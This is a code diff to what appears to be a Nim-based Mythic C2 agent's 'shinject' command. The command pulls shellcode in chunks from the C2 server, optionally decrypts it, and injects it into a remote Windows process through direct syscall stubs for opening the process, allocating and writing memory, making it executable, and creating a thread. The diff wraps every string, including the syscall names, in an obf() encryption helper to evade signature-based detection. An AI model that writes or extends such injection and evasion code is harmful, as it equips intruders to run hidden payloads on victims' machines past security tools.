@@ -1,4 +1,5 @@
 import json
+import ../utils/strenc
 
 when defined(windows):
   import base64
@@ -21,10 +22,10 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using direct syscalls
   when not defined(windows):
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "shinject is only supported on Windows"
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("shinject is only supported on Windows")
     }
   else:
     try:
@@ -32,20 +33,20 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
       
       # Step 1: Request the shellcode file from Mythic
       return %*{
-        "task_id": taskId,
-        "upload": {
-          "file_id": args.uuid,
-          "chunk_num": 1,
-          "chunk_size": CHUNK_SIZE,
-          "full_path": ""
+        obf("task_id"): taskId,
+        obf("upload"): {
+          obf("file_id"): args.uuid,
+          obf("chunk_num"): 1,
+          obf("chunk_size"): CHUNK_SIZE,
+          obf("full_path"): ""
         }
       }
     except Exception as e:
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Failed to parse shinject parameters: " & e.msg
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Failed to parse shinject parameters: ") & e.msg
       }
 
 proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string, 
@@ -64,28 +65,28 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
         return %*{
-          "task_id": taskId,
-          "upload": {
-            "chunk_size": CHUNK_SIZE,
-            "file_id": args.uuid,
-            "chunk_num": currentChunk + 1,
-            "full_path": ""
+          obf("task_id"): taskId,
+          obf("upload"): {
+            obf("chunk_size"): CHUNK_SIZE,
+            obf("file_id"): args.uuid,
+            obf("chunk_num"): currentChunk + 1,
+            obf("full_path"): ""
           }
         }
       
-      var output = "Injecting shellcode into remote process with PID " & $args.pid & "...\n"
+      var output = obf("Injecting shellcode into remote process with PID ") & $args.pid & obf("...\n")
 
       if args.encryption != "" and args.encryption != "none":
-        output.add("[*] Decrypting shellcode with " & args.encryption & "...\n")
+        output.add(obf("[*] Decrypting shellcode with ") & args.encryption & obf("...\n"))
         try:
           decryptPayload(fileData, args.encryption, args.key, args.iv, args.nonce)
-          output.add("[+] Decryption successful (" & $fileData.len & " bytes)\n")
+          output.add(obf("[+] Decryption successful (") & $fileData.len & obf(" bytes)\n"))
         except Exception as e:
           return %*{
-            "task_id": taskId,
-            "completed": true,
-            "status": "error",
-            "user_output": output & "[-] Decryption failed: " & e.msg
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): output & obf("[-] Decryption failed: ") & e.msg
           }
       
       let currProcess = GetCurrentProcessId()
@@ -114,36 +115,36 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       
       if sysNtOpenProcess == nil:
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": "Failed to allocate memory for syscall stubs"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("Failed to allocate memory for syscall stubs")
         }
       
       # Setup syscall stubs
       var dNtOpenProcess: NtOpenProcess = cast[NtOpenProcess](sysNtOpenProcess)
       discard VirtualProtect(sysNtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
-      discard GetSyscallStub("NtOpenProcess", sysNtOpenProcess)
+      discard GetSyscallStub(obf("NtOpenProcess"), sysNtOpenProcess)
       
       var sysNtAllocateVirtualMemory = cast[pointer](cast[uint](sysNtOpenProcess) + cast[uint](SYSCALL_STUB_SIZE))
       let dNtAllocateVirtualMemory = cast[NtAllocateVirtualMemory](sysNtAllocateVirtualMemory)
       discard VirtualProtect(sysNtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
-      discard GetSyscallStub("NtAllocateVirtualMemory", sysNtAllocateVirtualMemory)
+      discard GetSyscallStub(obf("NtAllocateVirtualMemory"), sysNtAllocateVirtualMemory)
       
       var sysNtWriteVirtualMemory = cast[pointer](cast[uint](sysNtAllocateVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
       let dNtWriteVirtualMemory = cast[NtWriteVirtualMemory](sysNtWriteVirtualMemory)
       discard VirtualProtect(sysNtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
-      discard GetSyscallStub("NtWriteVirtualMemory", sysNtWriteVirtualMemory)
+      discard GetSyscallStub(obf("NtWriteVirtualMemory"), sysNtWriteVirtualMemory)
       
       var sysNtProtectVirtualMemory = cast[pointer](cast[uint](sysNtWriteVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
       let dNtProtectVirtualMemory = cast[NtProtectVirtualMemory](sysNtProtectVirtualMemory)
       discard VirtualProtect(sysNtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
-      discard GetSyscallStub("NtProtectVirtualMemory", sysNtProtectVirtualMemory)
+      discard GetSyscallStub(obf("NtProtectVirtualMemory"), sysNtProtectVirtualMemory)
       
       var sysNtCreateThreadEx = cast[pointer](cast[uint](sysNtProtectVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
       let dNtCreateThreadEx = cast[NtCreateThreadEx](sysNtCreateThreadEx)
       discard VirtualProtect(sysNtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
-      discard GetSyscallStub("NtCreateThreadEx", sysNtCreateThreadEx)
+      discard GetSyscallStub(obf("NtCreateThreadEx"), sysNtCreateThreadEx)
       
       # Open target process
       ret = dNtOpenProcess(
@@ -154,13 +155,13 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       )
       
       if ret == 0:
-        output.add("[+] NtOpenProcess OK\n")
+        output.add(obf("[+] NtOpenProcess OK\n"))
       else:
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": output & "[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output & obf("[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n")
         }
       
       # Allocate memory in target process
@@ -175,14 +176,14 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       )
       
       if ret == 0:
-        output.add("[+] NtAllocateVirtualMemory OK\n")
+        output.add(obf("[+] NtAllocateVirtualMemory OK\n"))
       else:
         CloseHandle(hProcess)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": output & "[-] NtAllocateVirtualMemory failed!\n"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output & obf("[-] NtAllocateVirtualMemory failed!\n")
         }
       
       # Write shellcode to target process
@@ -195,15 +196,15 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       )
       
       if ret == 0:
-        output.add("[+] NtWriteVirtualMemory OK\n")
-        output.add("  \\_ Bytes written: " & $bytesWritten & " bytes\n")
+        output.add(obf("[+] NtWriteVirtualMemory OK\n"))
+        output.add(obf("  \\_ Bytes written: ") & $bytesWritten & obf(" bytes\n"))
       else:
         CloseHandle(hProcess)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": output & "[-] NtWriteVirtualMemory failed!\n"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output & obf("[-] NtWriteVirtualMemory failed!\n")
         }
       
       # Change memory protection to executable
@@ -218,14 +219,14 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       )
       
       if ret == 0:
-        output.add("[+] NtProtectVirtualMemory OK\n")
+        output.add(obf("[+] NtProtectVirtualMemory OK\n"))
       else:
         CloseHandle(hProcess)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": output & "[-] NtProtectVirtualMemory failed!\n"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output & obf("[-] NtProtectVirtualMemory failed!\n")
         }
       
       # Create remote thread to execute shellcode
@@ -244,39 +245,39 @@ proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string,
       )
       
       if ret == 0:
-        output.add("[+] NtCreateThreadEx OK\n")
+        output.add(obf("[+] NtCreateThreadEx OK\n"))
       else:
         CloseHandle(hProcess)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": output & "[-] NtCreateThreadEx failed!\n"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output & obf("[-] NtCreateThreadEx failed!\n")
         }
       
       CloseHandle(hThread)
       CloseHandle(hProcess)
       
-      output.add("[+] Injection successful!")
+      output.add(obf("[+] Injection successful!"))
       
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "success",
-        "user_output": output
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): obf("success"),
+        obf("user_output"): output
       }
       
     except Exception as e:
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Failed to inject shellcode: " & e.msg
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Failed to inject shellcode: ") & e.msg
       }
   else:
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "shinject is only supported on Windows"
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("shinject is only supported on Windows")
     } 
